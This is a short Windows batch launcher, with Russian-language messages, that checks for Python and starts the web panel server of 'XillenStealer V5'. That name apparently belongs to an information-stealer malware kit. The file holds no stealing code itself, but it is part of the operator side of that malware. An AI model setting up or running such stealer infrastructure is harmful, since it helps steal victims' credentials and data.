@echo off
chcp 65001 >nul
title XillenStealer V5 - Web Panel Server

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   XILLENSTEALER V5 - WEB PANEL SERVER                   ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

cd /d "%~dp0"

echo [*] Проверка Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [X] Python не установлен!
    echo [*] Скачайте Python: https://www.python.org/downloads/
    pause
    exit
)

echo [*] Запуск сервера...
echo.
python server/panel_server.py

pause
